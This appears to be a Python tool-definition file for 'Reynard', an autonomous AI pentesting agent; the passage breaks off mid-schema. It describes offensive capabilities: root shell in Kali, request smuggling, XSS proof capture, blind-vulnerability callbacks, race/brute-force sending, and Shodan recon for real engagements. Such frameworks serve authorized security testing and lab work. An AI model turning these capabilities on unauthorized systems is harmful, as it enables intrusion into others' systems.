"""
=============================================================================
Reynard — Tool Definitions & Execution Engine
=============================================================================
Provides all tools the agent can call:
  - run_shell:          Execute commands inside the Kali Docker container
  - read_file:          Read file contents from the container
  - write_file:         Write/create files in the container
  - list_dir:           List directory contents in the container
  - http_request:       Make HTTP requests with persistent cookie jar
  - browser_navigate:   Load a URL in headless Chromium (Playwright, JS rendered)
  - browser_execute_js: Execute JavaScript and return its value; capture alert() (XSS proof)
  - browser_interact:   Click elements, type into forms, submit via real selectors
  - caido_cloud_api:    Call Caido Cloud API operations
  - caido_cloud_request: Raw Caido Cloud REST fallback
  - caido_local_api:    Call local Caido Replay/history bridge operations

Each tool is defined as an OpenAI-compatible function schema and has a
corresponding execution function. The Docker container name is configurable.
=============================================================================
"""

import subprocess
import json
import os
import re
import shlex
import socket
import ssl
import time
from typing import Any
from urllib.parse import urlparse

from hacking_agent.core import browser as browser_mod
from hacking_agent.core import differ as differ_mod
from hacking_agent.core import oob
from hacking_agent.core import parsers as parsers_mod
from hacking_agent.core import sessions as session_mod
from hacking_agent.core import tool_selector as tool_selector_mod
from hacking_agent.core.tool_catalog import known_command_names, render_tool_catalog
from hacking_agent.core import web_research as web_research_mod
from hacking_agent.integrations import burp as burp_mod
from hacking_agent.integrations import caido as caido_mod
from hacking_agent.integrations import caido_local as caido_local_mod
from hacking_agent.integrations import race as race_mod
from hacking_agent.integrations import shodan as shodan_mod

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
CONTAINER_NAME = os.getenv("CONTAINER_NAME", "reynard-kali")
COOKIE_JAR_PATH = "/data/cookies/cookies.txt"  # legacy default
DEFAULT_TIMEOUT = 120  # seconds for shell commands
MAX_OUTPUT_LENGTH = 50000  # truncate very long outputs

# =============================================================================
# Tool Schemas (OpenAI function-calling format)
# =============================================================================

TOOL_SCHEMAS = [
    {
        "type": "function",
        "function": {
            "name": "run_shell",
            "description": (
                "Execute a shell command inside the Kali Linux Docker container. "
                "Returns stdout, stderr, and exit code. Use this for ALL pentesting "
                "tools (nmap, sqlmap, ffuf, burp, curl, python scripts, etc.). "
                "Commands run as root. The container has full network access and "
                "all Z4nzu hackingtool suite installed. If unsure which tool fits, "
                "call tool_inventory first. Use bash -c for pipes/redirects."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": (
                            "The shell command to execute. For complex commands with "
                            "pipes, redirects, or multiple statements, wrap in: "
                            "bash -c '...'. Example: bash -c 'curl -s http://target | grep flag'"
                        ),
                    },
                    "timeout": {
                        "type": "integer",
                        "description": (
                            "Timeout in seconds (default 120). Increase for long-running "
                            "scans like nmap or sqlmap."
                        ),
                    },
                },
                "required": ["command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "request_smuggling_probe",
            "description": (
                "Send raw HTTP/1.1 request-smuggling probes over one TCP/TLS "
                "connection without curl/browser normalization. Use this for "
                "PortSwigger HTTP request smuggling labs and CL.TE/TE.CL "
                "differential response checks. It can run the CL.TE 404 proof "
                "where a smuggled back-end request makes a subsequent GET / "
                "receive a 404 response."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "Target base URL, for example https://LAB.web-security-academy.net/.",
                    },
                    "vector": {
                        "type": "string",
                        "enum": ["auto", "cl_te_404", "cl_te_timeout", "te_cl_prefix"],
                        "description": "Probe vector. Use auto unless the lab title names CL.TE or TE.CL.",
                    },
                    "smuggled_path": {
                        "type": "string",
                        "description": "Path to smuggle for the CL.TE differential 404 proof. Default /404.",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Read timeout per raw exchange in seconds. Default 6.",
                    },
                },
                "required": ["url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "tool_inventory",
            "description": (
                "Return the Kali/CTF tool-selection catalog: which tools exist, "
                "when to use them, when to avoid them, and examples. Optionally "
                "checks actual command availability inside the Docker container. "
                "Use this before guessing tool names or repeatedly doing manual work."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "role": {
                        "type": "string",
                        "enum": ["general", "recon", "exploitation"],
                        "description": "Catalog focus. Default: general.",
                    },
                    "check_container": {
                        "type": "boolean",
                        "description": (
                            "If true, run command -v checks inside the container. "
                            "Default false for speed."
                        ),
                    },
                },
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "read_file",
            "description": (
                "Read the contents of a file from the Kali Docker container. "
                "Use this to read methodology files, scripts, loot, cookies, "
                "scan results, etc. Path must be absolute (e.g., /data/loot/flag.txt)."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "Absolute file path inside the container.",
                    },
                },
                "required": ["path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "write_file",
            "description": (
                "Write content to a file inside the Kali Docker container. "
                "Creates the file if it doesn't exist, overwrites if it does. "
                "Use this to create exploit scripts, save payloads, update "
                "methodologies, etc."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "Absolute file path inside the container.",
                    },
                    "content": {
                        "type": "string",
                        "description": "The content to write to the file.",
                    },
                },
                "required": ["path", "content"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_dir",
            "description": (
                "List contents of a directory inside the Kali Docker container. "
                "Returns files and directories with sizes and permissions."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": (
                            "Absolute directory path inside the container "
                            "(default: /data)."
                        ),
                    },
                },
                "required": ["path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "http_request",
            "description": (
                "Make an HTTP request using curl with a persistent cookie jar. "
                "Cookies are automatically saved/loaded between requests at "
                f"{COOKIE_JAR_PATH}. Supports all HTTP methods, custom headers, "
                "request bodies, and follows redirects. Use this for web "
                "application testing — login flows, CSRF, session management, etc."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "The target URL.",
                    },
                    "method": {
                        "type": "string",
                        "enum": ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"],
                        "description": "HTTP method (default: GET).",
                    },
                    "headers": {
                        "type": "object",
                        "description": (
                            "Custom headers as key-value pairs. "
                            "Example: {\"Content-Type\": \"application/json\"}"
                        ),
                    },
                    "data": {
                        "type": "string",
                        "description": (
                            "Request body (for POST/PUT). Can be form data "
                            "(key=value&key2=value2) or JSON string."
                        ),
                    },
                    "follow_redirects": {
                        "type": "boolean",
                        "description": "Follow HTTP redirects (default: true).",
                    },
                    "insecure": {
                        "type": "boolean",
                        "description": "Skip SSL certificate verification (default: true).",
                    },
                    "session": {
                        "type": "string",
                        "description": (
                            "Auth session name to use (e.g. 'admin', 'user1'). "
                            "Omit to use the currently active session. Use "
                            "list_sessions to see available identities."
                        ),
                    },
                },
                "required": ["url"],
            },
        },
    },
    # =========================================================================
    # Headless Chromium Browser Tools (Playwright, runs inside the container)
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "browser_navigate",
            "description": (
                "Navigate to a URL using a real headless Chromium browser (Playwright) "
                "inside the Kali container. Unlike curl, this renders the page with a "
                "full browser engine: client-side JS runs, the DOM settles, and dynamic "
                "content loads. The active auth session's cookies + static headers are "
                "injected automatically, so authenticated client-side labs work. "
                "ANY alert()/confirm()/prompt() dialog fired during load is captured and "
                "reported under 'dialogs'/'xss_proof' — a fired dialog is concrete XSS "
                "proof. Returns rendered HTML (or body text for markdown), final URL, "
                "title, HTTP status, and captured dialogs."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "The URL to navigate to.",
                    },
                    "output_format": {
                        "type": "string",
                        "enum": ["html", "markdown"],
                        "description": (
                            "Output format: 'html' for rendered HTML (best for "
                            "XSS/injection analysis), 'markdown' for body inner-text "
                            "(best for content extraction). Default: html."
                        ),
                    },
                    "wait_ms": {
                        "type": "integer",
                        "description": (
                            "Milliseconds to wait after page load for JS to execute. "
                            "Default: 2000. Increase for slow-loading SPAs."
                        ),
                    },
                    "session": {
                        "type": "string",
                        "description": (
                            "Auth session name to use (e.g. 'admin', 'user1'). "
                            "Omit to use the currently active session."
                        ),
                    },
                },
                "required": ["url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "browser_execute_js",
            "description": (
                "Execute JavaScript on a page loaded in headless Chromium (Playwright) "
                "and RETURN the script's evaluated value (JSON-serialized), not an HTML "
                "dump. CRITICAL for XSS labs: any alert()/confirm()/prompt() fired while "
                "the page loads or while your script runs is captured under 'dialogs' and "
                "surfaced as 'xss_proof' — treat a fired dialog as proof of DOM/stored/"
                "reflected XSS. Also use it to read document.cookie, extract "
                "JS-generated DOM values, or drive client-side frameworks. The active "
                "auth session cookies/headers are injected. The script may be a single "
                "expression (its value is returned) or a multi-statement body using "
                "'return'."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "The URL to navigate to before executing JS.",
                    },
                    "script": {
                        "type": "string",
                        "description": (
                            "JavaScript to evaluate in the page context. Its value is "
                            "returned. Examples: 'document.cookie', 'document.title', "
                            "'document.querySelector(\"#csrf\").value', "
                            "'return [...document.querySelectorAll(\"a\")].map(a=>a.href)'."
                        ),
                    },
                    "wait_ms": {
                        "type": "integer",
                        "description": (
                            "Milliseconds to wait after page load before executing JS. "
                            "Default: 2000."
                        ),
                    },
                    "session": {
                        "type": "string",
                        "description": (
                            "Auth session name to use. Omit for the active session."
                        ),
                    },
                },
                "required": ["url", "script"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "browser_interact",
            "description": (
                "Interact with a page using headless Chromium (Playwright) — click "
                "buttons, fill inputs, select options, submit forms, or press keys via "
                "real CSS selectors. The page is fully rendered (JS executed) before "
                "interaction and the active auth session cookies/headers are injected. "
                "Any alert()/confirm()/prompt() triggered by the interaction is captured "
                "under 'dialogs'/'xss_proof'. Useful for login/CSRF flows, multi-step "
                "exploits, and stored-XSS delivery paths."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "The URL to navigate to.",
                    },
                    "actions": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "action": {
                                    "type": "string",
                                    "enum": ["click", "type", "select", "submit", "press"],
                                    "description": (
                                        "The action: click, type (fill), select "
                                        "(option), submit (the element's form), or "
                                        "press (a key, default Enter)."
                                    ),
                                },
                                "selector": {
                                    "type": "string",
                                    "description": "CSS selector for the target element.",
                                },
                                "value": {
                                    "type": "string",
                                    "description": (
                                        "Value to type/select, or the key name for "
                                        "'press'. Ignored for click/submit."
                                    ),
                                },
                            },
                            "required": ["action", "selector"],
                        },
                        "description": (
                            "Ordered list of actions. Example: "
                            "[{action:'type', selector:'#username', value:'admin'}, "
                            "{action:'type', selector:'#password', value:'test'}, "
                            "{action:'click', selector:'button[type=submit]'}]"
                        ),
                    },
                    "wait_ms": {
                        "type": "integer",
                        "description": "Milliseconds to wait after page load. Default: 2000.",
                    },
                    "session": {
                        "type": "string",
                        "description": (
                            "Auth session name to use. Omit for the active session."
                        ),
                    },
                },
                "required": ["url", "actions"],
            },
        },
    },
    # =========================================================================
    # Out-of-Band (Interactsh) — for blind vulnerabilities
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "oob_get_domain",
            "description": (
                "Mint a unique OOB callback subdomain for a payload. Returns "
                "{token, domain, http_url}. Embed `domain` (or `http_url`) "
                "in payloads that test for blind vulnerabilities (blind SSRF, "
                "blind SQLi via DNS exfil, blind XXE, blind CMDi, log4shell). "
                "Then call `oob_poll(token=...)` after sending the payload to "
                "see if the target reached out. Use this for ANY blind vector — "
                "it's the only way to detect them reliably."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "label": {
                        "type": "string",
                        "description": (
                            "Short label tying this domain to its hypothesis "
                            "(e.g. 'ssrf-userid', 'blind-sqli-time'). Used "
                            "as a prefix in the token so callbacks are "
                            "self-documenting."
                        ),
                    },
                },
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "oob_poll",
            "description": (
                "Poll the OOB listener for callbacks. If `token` is given, "
                "only callbacks to that specific minted domain are returned "
                "(prevents cross-talk between concurrent payloads). Returns a "
                "list of interactions with protocol (http/dns/smtp/ldap), "
                "remote IP, and a sanitised request excerpt. ANY interaction "
                "= the target reached out = blind vuln likely confirmed."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "token": {
                        "type": "string",
                        "description": "Token from a prior oob_get_domain call. Empty = match all.",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Max seconds to wait for the first callback (default 15).",
                    },
                    "since_seconds": {
                        "type": "integer",
                        "description": "Ignore interactions older than this many seconds (default: no floor).",
                    },
                },
            },
        },
    },
    # =========================================================================
    # Multi-session auth (IDOR / horizontal & vertical privilege)
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "swap_session",
            "description": (
                "Switch the active HTTP/browser session to a previously "
                "registered identity (e.g. 'admin', 'user1', 'unauth'). "
                "All subsequent http_request and browser_* calls use that "
                "session's cookies/headers. Critical for IDOR/authz testing: "
                "alternate between user1 and user2 to confirm horizontal "
                "privilege issues, or between user and admin for vertical."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "name": {
                        "type": "string",
                        "description": "Registered session name (use list_sessions to see all).",
                    },
                },
                "required": ["name"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_sessions",
            "description": (
                "List all registered authenticated sessions and which one is "
                "currently active. Use this before swap_session if you're not "
                "sure which identities are available."
            ),
            "parameters": {"type": "object", "properties": {}},
        },
    },
    # =========================================================================
    # Differential analysis (boolean blind, IDOR, cache, authz)
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "capture_baseline",
            "description": (
                "Record a clean baseline response for an endpoint. Stores "
                "status, length, content hash, and a structural fingerprint. "
                "Subsequent `diff_against_baseline` calls compare future "
                "responses to this baseline — essential for boolean-blind "
                "SQLi (true vs. false), IDOR (different user, same response?), "
                "cache poisoning (poisoned vs. clean), authz bypass."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "name": {
                        "type": "string",
                        "description": "Symbolic name (e.g. 'login-true', 'user1-profile').",
                    },
                    "url": {"type": "string"},
                    "method": {"type": "string"},
                    "headers": {"type": "object"},
                    "data": {"type": "string"},
                    "session": {
                        "type": "string",
                        "description": "Optional session name to capture under.",
                    },
                },
                "required": ["name", "url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "diff_against_baseline",
            "description": (
                "Send a request and diff the response against a previously "
                "captured baseline. Returns status_delta, length_delta, "
                "content_similarity (0-1), structural_diff. Big differences "
                "= signal. Use this whenever you need to detect a blind "
                "boolean condition or compare cross-user/cross-tenant access."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "baseline_name": {"type": "string"},
                    "url": {"type": "string"},
                    "method": {"type": "string"},
                    "headers": {"type": "object"},
                    "data": {"type": "string"},
                    "session": {"type": "string"},
                },
                "required": ["baseline_name", "url"],
            },
        },
    },
    # =========================================================================
    # Recon expansions
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "nuclei_scan",
            "description": (
                "Run a nuclei scan against a target URL. Defaults to "
                "medium/high/critical templates (CVEs + vulnerabilities + "
                "misconfiguration). Returns parsed findings. Cheap broad "
                "coverage — run early in recon for known-CVE detection."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                    "severity": {
                        "type": "string",
                        "description": "Comma-separated severities (default: medium,high,critical).",
                    },
                    "templates": {
                        "type": "string",
                        "description": (
                            "Template path/tag (default: cves,vulnerabilities,"
                            "misconfiguration,exposures). Examples: "
                            "'cves/2024', 'tags=sqli,xss', 'http/cves'."
                        ),
                    },
                    "rate_limit": {
                        "type": "integer",
                        "description": "Max requests/second (default 50 — be polite).",
                    },
                },
                "required": ["url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "extract_js_endpoints",
            "description": (
                "Fetch all JavaScript files referenced by a page and extract "
                "URLs / API paths / parameter names from them. JavaScript "
                "files are the single richest source of hidden API endpoints "
                "on modern apps (especially SPAs). Returns deduplicated "
                "endpoint candidates with the source JS file each came from."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Page URL whose JS to harvest."},
                    "max_files": {"type": "integer", "description": "Max JS files to fetch (default 30)."},
                },
                "required": ["url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "discover_apis",
            "description": (
                "Probe well-known API discovery paths: /openapi.json, "
                "/swagger.json, /swagger-ui, /api-docs, /graphql (with "
                "introspection), /.well-known/, /robots.txt, /sitemap.xml. "
                "Returns each path with its status code and a snippet so "
                "the agent can pick the juicy ones."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "base_url": {"type": "string"},
                },
                "required": ["base_url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "analyze_response",
            "description": (
                "Analyze an HTTP response body for security-relevant signals. "
                "Returns structured JSON with: reflected (bool), reflection_context, "
                "encoded (bool), angular_detected, angular_version, angular_evaluated, "
                "csp_header, waf_detected, error_detected, forms, input_fields, "
                "lab_solved. Use this when you need to deeply analyze a response "
                "you received from http_request or browser_navigate. "
                "NOTE: http_request and browser_navigate responses are auto-analyzed, "
                "so only use this for re-analysis with different payloads."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "response_body": {
                        "type": "string",
                        "description": "The HTTP response body (HTML) to analyze.",
                    },
                    "payload": {
                        "type": "string",
                        "description": "The payload that was sent, for reflection detection.",
                    },
                },
                "required": ["response_body"],
            },
        },
    },
    # =========================================================================
    # Caido Cloud API Tools
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "caido_cloud_api",
            "description": (
                "Call a supported Caido Cloud API operation for Caido account, "
                "team, workspace, subscription, and PAT management. This is NOT "
                "for Replay, proxy history, or request testing; use caido_local_api "
                "for those. Uses CAIDO_PAT "
                "or CAIDO_CLOUD_PAT as a Bearer token for public API calls. "
                "Use status first to confirm configuration. PAT create/revoke "
                "use the dashboard GraphQL helper documented by Caido and require "
                "CAIDO_SESSION or args.session_cookie."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "operation": {
                        "type": "string",
                        "enum": [
                            "status",
                            "get_user",
                            "get_team",
                            "list_team_invitations",
                            "create_team_invitation",
                            "delete_team_invitation",
                            "get_team_subscription",
                            "list_team_users",
                            "delete_team_user",
                            "get_workspace",
                            "claim_voucher",
                            "create_pat",
                            "revoke_pat",
                        ],
                        "description": "Caido operation to execute.",
                    },
                    "args": {
                        "type": "object",
                        "description": (
                            "Operation-specific arguments. create_team_invitation: "
                            "{email, role, use_seat}; delete_team_invitation: "
                            "{invitation_id}; delete_team_user: {user_id}; "
                            "get_workspace: {workspace_id}; claim_voucher: {code}; "
                            "create_pat: {name, team_id, expires_at?, session_cookie?}; "
                            "revoke_pat: {pat_id, session_cookie?}."
                        ),
                    },
                },
                "required": ["operation"],
            },
        },
    },
    # =========================================================================
    # Caido Local Replay / History Bridge Tools
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "caido_local_api",
            "description": (
                "Preferred Caido testing bridge for API/web labs when the local "
                "Caido bridge plugin is running. Use this for Replay sessions, "
                "raw request send/resend, HTTP history search, and creating "
                "Caido findings. This talks to CAIDO_LOCAL_BRIDGE_URL "
                "(default http://127.0.0.1:17650). If unavailable, fall back to "
                "http_request/browser tools; use Burp MCP only for Burp-specific "
                "Collaborator/Scanner/Intruder workflows."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "operation": {
                        "type": "string",
                        "enum": [
                            "status",
                            "send_raw",
                            "create_replay_session",
                            "send_replay_session",
                            "search_history",
                            "get_history_item",
                            "create_finding",
                            "raw_bridge_request",
                        ],
                        "description": "Caido local bridge operation to execute.",
                    },
                    "args": {
                        "type": "object",
                        "description": (
                            "Operation arguments. send_raw/create_replay_session: "
                            "{raw_request, hostname, port?, https?, collection?, name?, send?}. "
                            "send_replay_session: {session_id}. search_history: "
                            "{query, limit?, include_response?}; query is HTTPQL or bridge-supported text. "
                            "get_history_item: {request_id, include_response?}. "
                            "create_finding: {title, severity, description, request_id?, evidence?}. "
                            "raw_bridge_request: {method, path, params?, json_body?, headers?, require_token?}."
                        ),
                    },
                },
                "required": ["operation"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "caido_cloud_request",
            "description": (
                "Raw Caido Cloud REST request fallback for any current or future "
                "OpenAPI path on CAIDO_API_BASE_URL (default https://api.caido.io). "
                "Uses CAIDO_PAT or CAIDO_CLOUD_PAT unless require_pat=false. "
                "Path must be a Caido API path such as /api/v1/team."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "method": {
                        "type": "string",
                        "enum": ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"],
                        "description": "HTTP method.",
                    },
                    "path": {
                        "type": "string",
                        "description": "Caido Cloud API path, e.g. /api/v1/user.",
                    },
                    "params": {
                        "type": "object",
                        "description": "Optional query parameters.",
                    },
                    "json_body": {
                        "type": "object",
                        "description": "Optional JSON request body.",
                    },
                    "headers": {
                        "type": "object",
                        "description": "Optional extra headers. Authorization is handled automatically.",
                    },
                    "require_pat": {
                        "type": "boolean",
                        "description": "Require CAIDO_PAT/CAIDO_CLOUD_PAT before calling (default true).",
                    },
                },
                "required": ["method", "path"],
            },
        },
    },
    # =========================================================================
    # Web Research Tools
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "web_search",
            "description": (
                "Search the public web for authorized CTF/lab writeups, walkthroughs, "
                "vulnerability advisories, CVEs, exploit notes, and official docs. "
                "Use this when stuck, when a service/version banner is known, or when "
                "researching a specific challenge name/error string. Prefer focused "
                "queries and follow promising URLs with web_fetch."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {
                        "type": "string",
                        "description": "Focused search query, e.g. 'HTB box name foothold writeup' or 'Apache 2.4.49 path traversal CVE'.",
                    },
                    "focus": {
                        "type": "string",
                        "enum": ["ctf", "vuln", "docs", "general"],
                        "description": "Search intent. ctf adds writeup/walkthrough terms; vuln adds CVE/advisory terms.",
                    },
                    "max_results": {
                        "type": "integer",
                        "description": "Number of results to return, 1-20 (default 8).",
                    },
                },
                "required": ["query"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "web_fetch",
            "description": (
                "Fetch a web page returned by web_search and extract readable text. "
                "Use it to pull relevant writeup steps, exploit details, CVE notes, "
                "or official documentation into context. Summarize and cite the URL "
                "in your findings rather than blindly copying."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "URL to fetch."},
                    "max_chars": {
                        "type": "integer",
                        "description": "Maximum extracted characters to return (default 12000).",
                    },
                },
                "required": ["url"],
            },
        },
    },
    # =========================================================================
    # Burp Suite MCP Tools
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "burp_send_http1_request",
            "description": (
                "Send an HTTP/1.1 request via Burp Suite MCP. The request will "
                "be logged in Burp's history and active scanning rules may apply. "
                "Use this instead of http_request when you want Burp to see the traffic."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "raw_request": {
                        "type": "string",
                        "description": "The raw HTTP/1.1 request string (e.g. 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n').",
                    },
                    "hostname": {
                        "type": "string",
                        "description": "Target hostname.",
                    },
                    "port": {
                        "type": "integer",
                        "description": "Target port (default 443).",
                    },
                    "https": {
                        "type": "boolean",
                        "description": "Use HTTPS (default true).",
                    },
                },
                "required": ["raw_request", "hostname"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "burp_get_scanner_issues",
            "description": (
                "Fetch issues identified by Burp Suite's professional active/passive scanner. "
                "Call this to import vulnerabilities found by Burp into your knowledge graph."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "count": {"type": "integer", "description": "Number of issues to return (default 50)."},
                    "offset": {"type": "integer", "description": "Pagination offset (default 0)."},
                },
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "burp_generate_collaborator_payload",
            "description": (
                "Generate a Burp Collaborator payload (Professional only) for Out-Of-Band (OOB) testing. "
                "Inject this payload into requests (SSRF, Blind SQLi, etc.) and use "
                "burp_get_collaborator_interactions to check for hits."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "custom_data": {"type": "string", "description": "Optional custom data to embed."},
                },
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "burp_get_collaborator_interactions",
            "description": (
                "Poll Burp Collaborator for OOB interactions. Can optionally filter by "
                "a specific payload ID from burp_generate_collaborator_payload."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "payload_id": {"type": "string", "description": "Optional payload ID to filter by."},
                },
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "burp_create_repeater_tab",
            "description": "Create a new Repeater tab in Burp UI with the specified HTTP request.",
            "parameters": {
                "type": "object",
                "properties": {
                    "raw_request": {"type": "string", "description": "The raw HTTP/1.1 request string."},
                    "hostname": {"type": "string"},
                    "port": {"type": "integer", "description": "default 443"},
                    "https": {"type": "boolean", "description": "default true"},
                    "tab_name": {"type": "string", "description": "Optional name for the Repeater tab."},
                },
                "required": ["raw_request", "hostname"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "burp_send_to_intruder",
            "description": "Send a request to Burp Intruder for fuzzing/brute-forcing.",
            "parameters": {
                "type": "object",
                "properties": {
                    "raw_request": {"type": "string", "description": "The raw HTTP/1.1 request string."},
                    "hostname": {"type": "string"},
                    "port": {"type": "integer", "description": "default 443"},
                    "https": {"type": "boolean", "description": "default true"},
                    "tab_name": {"type": "string", "description": "Optional name for the Intruder tab."},
                },
                "required": ["raw_request", "hostname"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "burp_get_proxy_history",
            "description": (
                "Fetch Burp Suite proxy HTTP history (requests/responses already seen "
                "by the proxy). Use this to review traffic captured while browsing or "
                "testing through Burp — a rich source of endpoints, parameters, tokens, "
                "and workflow steps. Requires the Burp MCP extension to be running."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "count": {"type": "integer", "description": "Number of history items (default 50)."},
                    "offset": {"type": "integer", "description": "Pagination offset (default 0)."},
                },
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "burp_get_proxy_history_regex",
            "description": (
                "Fetch Burp Suite proxy HTTP history filtered by a regular expression "
                "(matched against request/response). Use this to pull only the traffic "
                "you care about (e.g. a parameter name, an endpoint, a token pattern) "
                "instead of the full history. Requires the Burp MCP extension."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "regex": {"type": "string", "description": "Regex to filter history items."},
                    "count": {"type": "integer", "description": "Max items (default 50)."},
                    "offset": {"type": "integer", "description": "Pagination offset (default 0)."},
                },
                "required": ["regex"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "burp_set_intercept",
            "description": (
                "Enable or disable Burp Suite proxy intercept. Turn intercept OFF for "
                "automated/agentic testing so requests are not held in the intercept "
                "queue; turn it ON only when you deliberately want to pause and inspect "
                "traffic. Requires the Burp MCP extension."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "enabled": {
                        "type": "boolean",
                        "description": "True to intercept (pause) traffic, False to let it flow.",
                    },
                },
                "required": ["enabled"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "race_send",
            "description": (
                "Turbo-Intruder-style batch/racing HTTP sender over raw sockets "
                "(no curl/browser normalization). Fires N copies of one request "
                "with controlled concurrency and returns per-request status/timing "
                "plus a status distribution. Use for race conditions (limit-"
                "overrun/TOCTOU), HTTP request-smuggling follow-ups, and fast "
                "brute-force. mode='single_packet' opens all connections and "
                "releases the final byte together for the tightest race window; "
                "mode='parallel' fires full requests in concurrency-sized waves."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "Target URL including path/query, e.g. https://LAB/my-account.",
                    },
                    "count": {
                        "type": "integer",
                        "description": "Number of requests to send (default 20, max 200).",
                    },
                    "concurrency": {
                        "type": "integer",
                        "description": "Max in-flight requests per wave for 'parallel' (default = count).",
                    },
                    "method": {
                        "type": "string",
                        "description": "HTTP method (default GET). Use POST for form/JSON bodies.",
                    },
                    "headers": {
                        "type": "object",
                        "description": "Header name->value map (e.g. Cookie, Content-Type).",
                    },
                    "body": {
                        "type": "string",
                        "description": "Request body for POST/PUT (Content-Length is auto-added).",
                    },
                    "mode": {
                        "type": "string",
                        "enum": ["parallel", "single_packet"],
                        "description": "Timing strategy (default parallel).",
                    },
                    "timeout": {
                        "type": "number",
                        "description": "Per-request socket timeout in seconds (default 10).",
                    },
                },
                "required": ["url"],
            },
        },
    },
    # =========================================================================
    # OSINT / external recon (prod assessments; optional API keys)
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "shodan_host_lookup",
            "description": (
                "Look up an IP address in Shodan and return open ports, detected "
                "products/versions, hostnames, and known CVEs (vulns). External "
                "recon for real engagements — NOT needed for isolated labs. "
                "Degrades gracefully with a clear message when SHODAN_API_KEY is unset."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "ip": {"type": "string", "description": "IP address to look up."},
                    "history": {"type": "boolean", "description": "Include historical banners (default false)."},
                    "minify": {"type": "boolean", "description": "Return a minified record (default false)."},
                },
                "required": ["ip"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "shodan_search",
            "description": (
                "Search the Shodan index with a query (e.g. 'org:\"Acme\" http', "
                "'ssl.cert.subject.cn:example.com') and return matching hosts. Uses "
                "Shodan query credits. Degrades gracefully when SHODAN_API_KEY is unset."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {"type": "string", "description": "Shodan search query."},
